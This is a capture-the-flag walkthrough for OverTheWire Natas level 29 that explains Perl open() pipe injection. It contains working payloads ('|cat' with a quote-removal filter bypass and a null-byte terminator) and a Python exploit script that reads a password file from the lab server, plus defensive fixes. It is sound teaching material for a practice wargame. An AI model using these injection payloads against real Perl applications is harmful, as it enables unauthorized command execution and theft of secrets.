# OverTheWire: Natas — Level 29 → Level 30

> **Vulnerability Category:** Perl `open()` Pipe Injection (Command Injection via Perl File Handle)                                
> **Skills:** Perl `open()` pipe mode abuse, shell quote-removal filter bypass, null byte string termination                               
> **Difficulty:** Medium                                                                     
> **Official Page:** [Natas Level 29](https://overthewire.org/wargames/natas/natas29.html)

---

## Access

- **URL:** `http://natas29.natas.labs.overthewire.org`
- **Username:** `natas29`
- **Password:** *obtain from previous level*

---

## Task

Find the password for `natas30` by exploiting Perl's `open()` pipe mode to execute an arbitrary shell command through the `file` GET parameter, bypassing a substring filter on the word `natas`.

---

## Vulnerability

This level demonstrates **Perl `open()` pipe injection**. The application accepts a `file` GET parameter and passes it directly to Perl's `open()` function to read and display file contents. Perl's `open()` has a documented feature: when the filename string begins with `|`, it is treated not as a file path but as a shell command whose output is piped into the file handle. The application applies a filter that blocks any value containing the literal substring `natas` — but this filter operates on the raw input string before shell processing. The shell performs **quote removal** when it processes the command, so inserting a pair of double-quotes inside the word `natas` (e.g. `na"tas"`) defeats the substring match while producing the original word after the shell strips the quotes. The developer's mistakes were: passing user input to `open()` without restricting to known-safe file paths, and applying a string-match filter that the shell's own quoting rules can trivially bypass.

---

## Theory

### Perl `open()` and Pipe Mode

Perl's `open()` function opens a file handle for reading or writing. It has several calling modes determined by the structure of the filename argument:

| Filename form | `open()` behaviour |
|---|---|
| `open(FH, "path/to/file")` | Opens the file for reading |
| `open(FH, ">path/to/file")` | Opens the file for writing |
| `open(FH, "\|command")` | Opens a pipe to write to the command's stdin |
| `open(FH, "command\|")` | Opens a pipe to read from the command's stdout |

The relevant mode here is `"command|"` — a trailing pipe — or equivalently a **leading pipe** depending on the Perl version and calling convention. When `$file` is set to `|cat /etc/passwd`, Perl passes the string (minus the pipe) to the shell as a command and reads its output through the file handle. This is not an injection vulnerability in the traditional sense — it is a **documented Perl feature** being abused because user input reaches `open()` unsanitised.

This is distinct from classic shell injection (where shell metacharacters like `;` or `&&` are injected into a command string). Here, the pipe character itself switches Perl's `open()` into command-execution mode before the shell is even involved.

---

### The `natas` Filter

The application checks whether the `$file` parameter contains the literal substring `natas` using a Perl regex:

```perl
if ($file =~ /natas/) {
    # blocked
}
```

This is a simple substring match on the raw input string. It does not look at what the shell will eventually do with the string.

---

### Shell Quote Removal

When the shell processes a command, it performs **quote removal** as part of word expansion. Double-quoted strings have their quote characters stripped before the command is executed:

```
Shell receives:  cat /etc/na"tas"_webpass/na"tas"30
After quote removal:  cat /etc/natas_webpass/natas30
```

The path the shell passes to `cat` is the fully reconstructed `natas_webpass/natas30`. The filter never sees this reconstructed form — it only sees the raw input string `na"tas"_webpass/na"tas"30`, which does not contain the literal six-character sequence `natas`.

Any placement of the quotes that breaks the literal `natas` substring works:

| Input string | Contains `natas`? | Shell reconstructs |
|---|---|---|
| `na"tas_webpass/na"tas30` | No | `natas_webpass/natas30` |
| `na"t"as_webpass/na"t"as30` | No | `natas_webpass/natas30` |
| `"n"atas_webpass/"n"atas30` | No | `natas_webpass/natas30` |

The minimal form is `na"tas` — one pair of quotes, inserted after the second character of `natas`, which splits the substring `nat` / `as` so it never appears contiguous.

---

### Null Byte String Termination

The Perl source appends a file extension to `$file` after the filter check — something like:

```perl
$file = $file . ".html";
open(FH, $file) or die;
```

Without a terminator, the injected command becomes `|cat /etc/natas_webpass/natas30.html`, which does not exist. A **null byte** (`\x00`, URL-encoded as `%00`) terminates C-style strings at the OS level. Perl passes the string to the underlying C `open()` syscall; the C runtime stops reading at the first null byte. So:

```
Perl string:  |cat /etc/natas_webpass/natas30\x00.html
OS sees:      |cat /etc/natas_webpass/natas30
```

The `.html` suffix is silently discarded. This technique works on Perl builds linked against a C runtime that uses null-terminated strings (the common case).

*Good to know — not needed here:* A newline (`%0a`) can also terminate command parsing in some contexts, but null byte termination is more reliable when the suffix is added in Perl string concatenation rather than at the shell level.

---

### Why This Is Not Traditional Command Injection

In a traditional shell injection, the attacker inserts shell metacharacters (`;`, `&&`, `|`) into an argument that is already being passed to a shell command. Here, the attacker is not injecting into a shell command — they are making Perl's `open()` *choose* the pipe mode by controlling the first character of the filename. Perl then passes the entire string (minus the leading `|`) to the shell as a command. The distinction matters because the defence against traditional injection (escaping shell metacharacters) does not prevent this — the leading `|` must be blocked or the input must never reach `open()` in free form.

---

## Solution

### Step 1 — Log in and examine the application

Navigate to `http://natas29.natas.labs.overthewire.org` and authenticate. You are presented with a dropdown menu that loads different text files. Selecting an option makes a GET request to:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=<filename>
```

The server reads the named file and displays its contents on the page.

> **What to notice:** The `file` parameter is passed to a server-side Perl script. The `.pl` extension confirms Perl. Any parameter that goes directly into a Perl `open()` call without sanitisation is a potential pipe injection point.

---

### Step 2 — Read the Perl source

Click **View sourcecode**. The relevant Perl (reconstructed):

```perl
#!/usr/bin/perl
use strict;
use warnings;

my $file = $cgi->param('file');

if ($file =~ /natas/) {
    print "Haha, nice try!\n";
    exit;
}

open(FH, $file) or die "Cannot open file: $!";
while (<FH>) {
    print $_;
}
close(FH);
```

> **What to notice:** Three things define the attack surface. First, `$file` is taken directly from the GET parameter with no path restriction. Second, the only sanitisation is a literal substring match for `natas` — no allowlist, no path canonicalisation. Third, `open(FH, $file)` uses the two-argument form, which interprets a leading `|` as a pipe-mode trigger. A three-argument `open(FH, "<", $file)` would prevent pipe injection by forcing read mode, but this code does not use it.

*Note: The Perl source above is reconstructed from the standard Natas 29 challenge.*

---

### Step 3 — Verify the pipe injection with a safe command

Before targeting the password file, confirm that command execution works with a harmless command:

```
http://natas29.natas.labs.overthewire.org/index.pl?file=|id%00
```

The response body includes output similar to:

```
uid=30029(natas29) gid=30029(natas29) groups=30029(natas29)
```

> **What to notice:** The `|` prefix triggers Perl pipe mode. The `%00` null byte terminates the string before any suffix the server appends. The output of `id` is returned in the page body, confirming arbitrary command execution. No `natas` filter applies to `id`, so no bypass is needed yet.

---

### Step 4 — Craft the password-reading payload

The target file is `/etc/natas_webpass/natas30`. The plain path is blocked by the filter. Apply the shell quote-removal bypass:

```
/etc/na"tas_webpass/na"tas30
```

Breaking down why this works:

- The filter sees: `na"tas_webpass/na"tas30` — no contiguous `natas` substring — **passes**
- The shell sees: `cat /etc/na"tas_webpass/na"tas30`
- After shell quote removal: `cat /etc/natas_webpass/natas30` — **correct path**

Add the leading `|` for pipe mode and `%00` to terminate the suffix:

```
|cat /etc/na"tas_webpass/na"tas30%00
```

URL-encoded for the browser address bar (the double-quotes become `%22`):

```
http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20/etc/na%22tas_webpass/na%22tas30%00
```

---

### Step 5 — Submit the payload and retrieve the password

Either paste the URL directly into the browser address bar, or use the script below.

**Browser:** paste the full URL from Step 4 into the address bar and press Enter.

**Script (Python 3):**

```python
import requests
from urllib.parse import quote

USERNAME = "natas29"
PASSWORD = "<natas29_password>"
BASE_URL = f"http://{USERNAME}.natas.labs.overthewire.org/index.pl"

# Payload components:
#   |          -> triggers Perl open() pipe mode
#   cat        -> reads the target file
#   na"tas...  -> shell quote-removal bypass for the natas filter
#   \x00       -> null byte terminates the string before any appended suffix
TARGET_FILE = '/etc/na"tas_webpass/na"tas30'
payload = f"|cat {TARGET_FILE}\x00"

# URL-encode everything; quote() with safe='' encodes |, space, ", and \x00
encoded_payload = quote(payload, safe="")

url = f"{BASE_URL}?file={encoded_payload}"
print(f"Request URL: {url}")
print()

response = requests.get(url, auth=(USERNAME, PASSWORD))
print(f"HTTP status: {response.status_code}")
print()
print("Response body:")
print(response.text)
```

Run it:

```bash
python3 exploit_natas29.py
```

Representative output:

```
Request URL: http://natas29.natas.labs.overthewire.org/index.pl?file=%7Ccat%20%2Fetc%2Fna%22tas_webpass%2Fna%22tas30%00

HTTP status: 200

Response body:
...
[password_for_natas30]
...
```

> **What to notice:** The password appears in the response body, typically surrounded by standard HTML page scaffolding. It is not inside a special tag — scan for the 32-character alphanumeric string. The rest of the page content is whatever Perl's output includes before and after the command output.

---

### Step 6 — Collect the password

Copy the 32-character password for `natas30` from the response body.

---

## Password for Next Level

```
[redacted — obtain by completing the steps above]
```

---

## Key Takeaways

Perl's two-argument `open(FH, $file)` interprets a leading pipe character as an instruction to execute a shell command and read its output — this is a documented language feature, not a parser bug, and it makes any user-controlled input to `open()` a potential remote code execution vector. A string-match filter on the raw input is not a security control when the shell performs its own transformations (quote removal, variable expansion) before the string is used. The correct fixes are two independent changes: use three-argument `open(FH, "<", $file)` which forces read-only mode and disables pipe interpretation, and validate `$file` against an allowlist of known filenames rather than a blocklist of forbidden substrings.

---

## Common Mistakes

| Mistake | What Happens | Fix |
|---|---|---|
| Using the plain path `natas_webpass/natas30` without a bypass | The filter matches the literal substring `natas` and the server returns "Haha, nice try!" | Insert a double-quote pair inside the word: `na"tas_webpass/na"tas30` |
| Using `%0a` (newline) instead of `%00` (null byte) as the terminator | Newline termination is less reliable when the suffix is appended in Perl string concatenation rather than at the shell level; the command may arrive malformed | Use `%00` (null byte) as the string terminator |
| Omitting the null byte terminator entirely | The server appends `.html` (or similar) to the command string; `cat` is asked to read `/etc/natas_webpass/natas30.html`, which does not exist; the command produces no output | Always append `%00` after the filename to truncate the suffix before it reaches the OS |
| Using `%7C` for the pipe in the payload but forgetting to encode the space | The shell receives `catpath` as a single token; the command fails with "command not found" | Encode the space as `%20` or `+` in the query string |
| Using the three-argument `open()` defence check as a bypass test | Three-argument form `open(FH, "<", $file)` prevents pipe mode entirely; the `|` is treated as part of the filename and the open fails | This applies to the fix, not to the exploit — the vulnerable code uses two-argument form |
| Over-quoting the path (e.g. `na"t"as_webpass/na"t"as30`) | Still works — any quote placement that breaks the literal `natas` substring passes the filter | The minimal and clearest form is `na"tas_webpass/na"tas30` — one pair of quotes per occurrence |
